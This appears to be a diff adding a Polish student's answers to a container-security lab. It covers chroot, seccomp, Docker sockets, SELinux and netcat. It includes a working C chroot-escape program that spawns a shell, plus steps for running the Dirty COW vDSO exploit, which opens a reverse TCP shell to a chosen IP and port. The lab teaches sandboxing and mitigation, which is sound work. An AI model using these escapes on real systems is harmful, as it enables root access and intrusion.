@@ -1,0 +1,112 @@
+1. 
+do wyświetlenia wskazania:
+ll /proc/self/root
+
+kod, plik chroot_trial.c:
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/stat.h>
+
+int main(){
+    
+    mkdir("foo", 0755);
+    chroot("foo");
+    chroot("../../../../../../../../../../../../../../../..");
+    return execl("/bin/sh", "-i", NULL);
+}
+
+do odpalenia powyższego:
+gcc -o chroot_trial chroot_trial.c 
+./chroot_trial
+
+2. 
+Żeby zobaczyć jakie program p z argumentami args wykorzystuje wywołania systemowe:
+
+sudo strace -c -f -S name p args 2>&1 1>/dev/null | tail -n -2 | head -n +3 
+^ jakiś output
+
+potem w kodzie dla każdego x <- output:
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <seccomp.h>
+#include <fcntl.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <stddef.h>
+#include <err.h>
+#include <unistd.h>
+#include <signal.h>
+
+#define ADD(x)\
+    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(x), 0)
+
+
+int main(int argc, char* argv[], char *envp[]){
+    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
+    
+    ADD(write);
+    ADD(read);
+    ADD(fstat);
+    ADD(mmap);
+    ADD(rt_sigaction);
+    ADD(rt_sigprocmask);
+    ADD(rt_sigreturn);
+    ADD(clone);
+    ADD(wait4);
+    ADD(execve);
+    ADD(exit_group); //dotąd programy korzystające z stdin stdout i stderr
+
+    ADD(...); //to do rozbudowy
+    ...
+    seccomp_load(ctx);
+    
+    //jakiś kod który testuje sandboxa
+
+    seccomp_release(ctx);
+
+}
+
+
+3.
+a) plik /var/run/docker.sock jest domyślnym socketem unixowym na którym nasłuchuje daemon Dockera, i może być wykorzystywany do komunikacji z dameonem wewnątrz określonego kontenera.
+b) SELinux pełni rolę systemu kontroli dostępu do plików. Z włączonym użytkownik kontenera ma dostęp tylko do tych plików, na które SELinuch mu pozwoli. Bez tego kontenery mają dostęp do wszytkiego (w szczególności mogą montować u siebie dowolne, nawet docelowo zastrzeżone, katalogi).
+c) niebezpieczeństwo polega na tym, że użytkownik ma dostęp do całego systemu pliku hosta w katalogu /mnt w kontenerze
+
+4. 
+żeby odpalić ten kontener pobieramy repo, i wykonujemy po kolei w pobranym katalogu:
+docker build -t dirtycow .
+żeby odpalić kontener:
+sudo docker run -it dirtycow /bin/bash
+
+pojawia się prompt ubuntu :( 
+wykonujemy: cd /dirtycow-vdso
+sprawdzamy ip-ka: ifconfig
+potem są chyba 2 opcje:
+- albo kodujemy w little endian ip i port 1234, odalamy po kolei: 
+make
+./0xdeadbeef
+- albo wykonujemy bez kodowania 
+make
+./0xdeadbeef ip:1234
+exploit powinien zadziałać 
+żeby zapobiec, powinna pomóc komenda:
+sudo docker run -it --ipc="none" dirtycow /bin/bash
+
+a) Exploit potrzebuje wystawiony port, żeby otworzyć "reverse TCP connection" mające służyć jako shell dla zahardkodowanego ip (albo localhost albo z miejsca z którego faktycznie wykonujemy exploit) 
+b) ponieważ exploit wykorzystuje vsdo (virtual shareable data object), w celu zapobiegnięcia exploitu należy zabronić kontenerowi wykorzystywania współdzielonej pamięci z hostem poprzez parametr --ipc="none" przekazany dockerowi
+
+
+
+5. 
+Można odpalić kontener z hellp.py, printujący hello world.
+Potem można usunąć z whitelisty domyślnego profilu syscall write. Pojawią się problemy.
+
+Żeby mieć dostęp do kontenera netcata, należy wykonać:
+sudo docker run -it --rm -p 9000:9000 --security-opt seccomp=whitelist.json gophernet/netcat -l -p 9000
+
+używać netcata unixowego używamy:
+nc 127.0.0.1 9000 < file
+mając jakąś zawartość file.
+
